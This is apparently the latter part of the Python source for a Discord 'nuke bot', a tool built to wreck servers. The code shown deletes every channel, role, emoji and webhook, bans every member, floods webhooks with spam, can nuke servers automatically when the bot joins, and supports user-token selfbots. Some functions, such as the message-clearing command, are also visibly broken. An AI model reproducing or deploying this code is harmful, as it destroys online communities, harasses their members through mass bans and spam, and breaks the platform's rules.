                checked_channel = containing(selected_server.text_channels, channel)
                if checked_channel is None:
                    await log(ctx, f'Cannot find channel {channel}.')
                    continue
                payload = {'name': random_b64()}
                q.put((requests.post, f'https://discord.com/api/v8/channels/{checked_channel.id}/webhooks', headers, payload))
    elif args[0] == 'delete' or args[0] == 'remove':
        name = args[1]

        webhook = containing(await selected_server.webhooks(), name)

        if webhook is None:
            await log(ctx, f'Unable to find webhook `{name}`')
            return

        try:
            consoleLog(webhook.url)
            await webhook.delete()
            consoleLog(f'Webhook `{webhook.name}` is removed from the server.')
        except:
            consoleLog(f'Unable to delete webhook `{webhook.name}`.')
            raise
    
    elif args[0] == 'attack':
        global webhook_targets
        args.pop(0) # Removing the attack keyword
        try:
            webhooks = await selected_server.webhooks()
            webhooks_length = len(webhooks)
            loaded_length = 0
            if len(args) > 0 and args[0].lower() == 'all':
                for webhook in webhooks:
                    webhook_targets.append(webhook)
                    loaded_length += 1
            elif args[0] == 'start':
                target_list_length = len(webhook_targets)
                if target_list_length == 0:
                    await log(ctx, f'You don\'t have anything in the attack list. It\'s really not a good idea to waste your wifi bandwidth and your cpu. Maybe try: `{command_prefix}webhook attack all` or `webhook attack 5`.')
                headers = {
                    'content-type': 'application/json'
                }

                if len(args) < 2:
                    args.append(10)
                elif not args[1].isdigit():
                    await log(ctx, 'Please enter a positive integer.')
                    return
                
                usernames_length = len(webhook_spam['usernames'])
                contents_length = len(webhook_spam['contents'])
                pfp_length = len(webhook_spam['pfp_urls'])
                 
                for i in range(int(args[1])):
                    payload = {
                        'username': webhook_spam['usernames'][randrange(usernames_length)],
                        'content': webhook_spam['contents'][randrange(contents_length)],
                        'avatar_url': webhook_spam['pfp_urls'][randrange(pfp_length)]
                    }
                    q.put((requests.post, webhook_targets[randrange(target_list_length)].url, headers, payload))
            
            elif len(args) > 0 and args[0].isdigit() and int(args[0]) <= webhooks_length:
                for i in range(int(args[0])):
                    webhook_targets.append(webhooks.pop(randrange(webhooks_length)))
                    webhooks_length -= 1
                    loaded_length += 1
            elif args[0] == 'list':
                if len(args) < 2:
                    args.append('1')
                await embed(ctx, args[1], 'Targets on attacking list', webhook_targets)
            elif args[0] == 'offload':
                webhook_targets = []
                await log(ctx, f'All webhooks have been offloaded')
            else:
                for webhook in args:
                    webhook = containing(await selected_server.webhooks(), webhook)
                    if webhook is None:
                        await log(ctx, f'Unable to find webhook `{webhook}`.')
                        continue
                    webhook_targets.append(webhook)
                    loaded_length += 1

            if args[0] != 'list' and args[0] != 'start' and args[0] != 'offload':
                await log(ctx, f'`{str(loaded_length)}` has been loaded into the target list.')

        except:
            raise
            
    else:
        await log(ctx, f'Unable to find `{args[0]}` command in webhook scripts.')
    

######### Nukes #########
@commands.check(checkPerm)
@client.command(name='nuke')
async def nuke(ctx):
    if not await hasTarget(ctx):
        return

    await log(ctx, f'A nuke has been deployed on `{selected_server.name}`.')
    tasks = [deleteAllChannels(ctx), deleteAllEmojis(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx)]
    await asyncio.gather(*tasks)

    if len(after) > 0:
        consoleLog('Running after commands...')
        for command in after:
            # Lol im so smart to think some like this would work
            ctx.message.content = command_prefix + command
            await client.process_commands(ctx.message)

        consoleLog('After commands completed.')

@commands.check(checkPerm)
@client.command(name='deleteAllRoles', aliases=['dar', 'dAllRoles'])
async def deleteAllRoles(ctx):
    if not await hasTarget(ctx):
        return

    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token

    consoleLog('Starting to delete all roles...')
    for role in selected_server.roles:
        q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles/{role.id}', headers, None))
        
    q.join()
    consoleLog('Finished deleting roles.')

@commands.check(checkPerm)
@client.command(name='deleteAllChannels', aliases=['dac', 'dAllChannels'])
async def deleteAllChannels(ctx):
    if not await hasTarget(ctx):
        return

    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token

    consoleLog('Starting to delete all types of channels...')
    for channel in selected_server.channels:
        q.put((requests.delete, f'https://discord.com/api/v8/channels/{channel.id}', headers, None))
        
    q.join()
    consoleLog('Finished deleting channels.')

@commands.check(checkPerm)
@client.command(name='deleteAllEmojis', aliases=['dae', 'dAllEmoji'])
async def deleteAllEmojis(ctx):
    if not await hasTarget(ctx):
        return

    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token

    consoleLog('Starting to delete all emojis...')
    for emote in selected_server.emojis:
        q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/emojis/{emote.id}', headers, None))
        
    q.join()
    consoleLog('Finished deleting emojis.')

@commands.check(checkPerm)
@client.command(name='deleteAllWebhooks', aliases=['daw', 'dAllWebhooks'])
async def deleteAllWebhooks(ctx):
    if not await hasTarget(ctx):
        return

    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token

    consoleLog('Starting to delete all webhooks...')
    for webhook in await selected_server.webhooks():
        q.put((requests.delete, f'https://discord.com/api/v8/webhooks/{webhook.id}', headers, None))
        
    q.join()
    consoleLog('Finished deleting webhooks.')

@commands.check(checkPerm)
@client.command(name='banAll')
async def banAll(ctx):
    if not await hasTarget(ctx):
        return

    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token

    payload = {'delete_message_days':'0', 'reason': ''}
    consoleLog('Starting ban all...')
    for member in selected_server.members:
        q.put((requests.put, f'https://discord.com/api/v8/guilds/{selected_server.id}/bans/{member.id}', headers, payload))
        
    q.join()
    consoleLog('Ban all completed')

## Additional functions ##
@commands.check(checkPerm)
@client.command(name='checkRolePermissions', aliases=['check', 'crp'])
async def checkRolePermissions(ctx, name, n='1'):
    if not await hasTarget(ctx):
        return
    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number.')
        return
    member = containing(selected_server.members, nameIdHandler(name))
    if member is None:
        await log(ctx, f'Unable to found {name}.')
        return

    temp = sorted(member.guild_permissions, key=lambda p: p)
    value = member.guild_permissions.value
    master_list = ''

    item_length = 31
    init_item = n * per_page
    final_item = init_item + per_page
    if init_item > item_length - per_page:
        if init_item > item_length:
            await ctx.send('Invalid page number.')
            return
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page
    for i in range(init_item, final_item, 1):
        item, has_perm = temp[i]
        if has_perm:
            master_list += ':white_check_mark: '
        else:
            master_list += ':x: '
        master_list += item.replace('_', ' ').capitalize() + '\n'
    
    try:
        embed = discord.Embed(
            title = 'User permissions',
            description = f'Encoded value: {str(value)} : 2147483647',
            color = discord.Color.red()
        )

        embed.add_field(name='Permissions', value=master_list, inline=True)
        embed.set_footer(text=f'{str(n+1)}/{str(ceil(item_length / per_page))}')
        await ctx.channel.send(embed=embed)
    except:
        await ctx.channel.send('```diff\n%s %d/%d```' % (master_list.replace(':white_check_mark:', '+').replace(':x:', '-'), n+1, ceil(item_length / per_page)))

@commands.check(checkPerm)
@client.command(name='si', aliases=['serverIcon', 'changeServerIcon'])
async def si(ctx, path=None):
    if not await hasTarget(ctx):
        return
    if path is None:
        await selected_server.edit(icon=None)
        await log(ctx, f'Successfully removed the server icon from `{selected_server.name}`.')
    elif path.startswith(('https://', 'http://', 'ftp://', 'ftps://')): # Link EX: https://www.example.com/aaa.png
        try:
            await selected_server.edit(icon=BytesIO(requests.get(path).content).read())
            consoleLog('Successfully changed the current server icon.')
        except:
            raise
    elif path[0] == '<': # EX: <a:triggeredd:627060014431076352>
        path = path.split(':')
        try:
            if path[0] == '<a': # Animated
                await selected_server.edit(icon=discord.File(BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{path[2][:-1]}.gif?v=1').content).read()))
            else:
                await selected_server.edit(icon=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{path[2][:-1]}.png?v=1').content).read())
            await log(ctx, 'Successfully changed server icon.')
        except:
            raise
    elif os.path.isfile(path): # File EX: C:\Users\user\Desktop\something.jpg or EX: .\icon\something.jpg
        with open(path, 'rb') as data:
            await selected_server.edit(icon=data.read())
            await log(ctx, 'Successfully changed server icon.')
    else:
        try: 
            unicode_number = str(ord(path)) + ', '
        except:
            unicode_number = ''
        unicode_string = path.encode('utf8')
        sys.stdout.buffer.write(f'"{path}" is not supported to be set as a server icon.'.encode('utf8'))
        consoleLog(unicode_number)
        await log(ctx, f'{path} is not supported to be set as a server icon.')
        await log(ctx, f'Character\'s bytes: {unicode_number}{unicode_string}')

@commands.check(checkPerm)
@client.command(name='sn', aliases=['serverName', 'changeServerName'])
async def sn(ctx, *, name):
    if not await hasTarget(ctx):
        return

    try:
        await selected_server.edit(name=name)
        await log(ctx, f'Server name has been changed to `{name}`.')
    except Exception:
        await log(ctx, 'Unable to change server name.')
        raise

@commands.check(checkPerm)
@client.command(name='clear', aliases=['purge'])
async def clear(ctx, n=None):
    if not await hasTarget(ctx):
        return

    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token

    consoleLog('Starting to delete all types of channels...')
    for channel in ctx.history(limit=n):
        q.put(requests.delete, f'https://discord.com/api/v8/channels/{ctx.channel.id}/messages/788936893084729364', )

@commands.check(checkPerm)
@client.command(name='leave')
async def leave(ctx, name=None):
    if name is None:
        if not await hasTarget(ctx):
            return
        await selected_server.leave()
    else:
        server = containing(client.guilds, name)
        if server is None:
            await log(ctx, f'Unable to find server {name}.')
            return
        await server.leave()

        await log(ctx, f'Left {name}.')

@commands.check(checkPerm)
@client.command(name='leaveAll')
async def leaveAll(ctx):
    await log(ctx, 'Leaving all servers. Note: You won\'t be able to message me after I left all servers.')
    for server in client.guilds:
        await server.leave() 
    consoleLog('Left all servers.')

@commands.check(checkPerm)
@client.command(name='joinNuke', aliases=['nukeOnJoin', 'join nuke'])
async def joinNuke(ctx, true_or_false):
    global saved_ctx, nuke_on_join
    if true_or_false.lower() == 'true':
        saved_ctx = ctx
        nuke_on_join = True
        await log(ctx, 'Nuke on bot joining a new server has been turned on.')
    elif true_or_false.loewr() == 'false':
        nuke_on_join = False
        await log(ctx, 'Nuke on bot joining a new server has been turned off.')
    else:
        await log(ctx, 'Invalid flag: true or false.')

@commands.check(checkPerm)
@client.command(name='changeStatus', aliases=['cs'])
async def changeStatus(ctx, status):
    if status == 'offline':
        await client.change_presence(status=discord.Status.offline)
    elif status == 'invisible':
        await client.change_presence(status=discord.Status.invisible)
    elif status == 'online':
        await client.change_presence(status=discord.Status.online)
    elif status == 'idle':
        await client.change_presence(status=discord.Status.idle)
    elif status == 'dnd' or status == 'do_not_disturb':
        await client.change_presence(status=discord.Status.do_not_disturb)

@commands.check(checkPerm)
@client.command(name='link', aliases=['l'])
async def link(ctx):
    await ctx.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')

@commands.check(checkPerm)
@client.command(name='off', aliases=['logout', 'logoff', 'shutdown', 'stop'])
async def off(ctx):
    ### Discord takes too long to realize if the bot is offline people might get confused about the not turning off the bot vs discord takes time to update
    await client.change_presence(status=discord.Status.offline)
    await client.logout()

###### Closing handler ######

###### https://github.com/aio-libs/aiohttp/issues/4324
from functools import wraps
from asyncio.proactor_events import _ProactorBasePipeTransport
def silence_event_loop_closed(func):
    @wraps(func)
    def wrapper(self, *args, **kwargs):
        try:
            return func(self, *args, **kwargs)
        except RuntimeError as e:
            if str(e) != 'Event loop is closed':
                raise
    return wrapper
_ProactorBasePipeTransport.__del__ = silence_event_loop_closed(_ProactorBasePipeTransport.__del__)

try:
    client.run(token, bot=not is_selfbot)
# except discord.LoginFailure:
#     print('Invalid token is being used.')
#     exit()
except discord.PrivilegedIntentsRequired:
        print('PrivilegedIntentsRequired: Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application\'s page. If this is not possible, then consider disabling the privileged intents in the bot\'s source code instead. Go visit https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot to see how to properly add privileged intents.')
        exit()
finally:    
    print('Exiting...')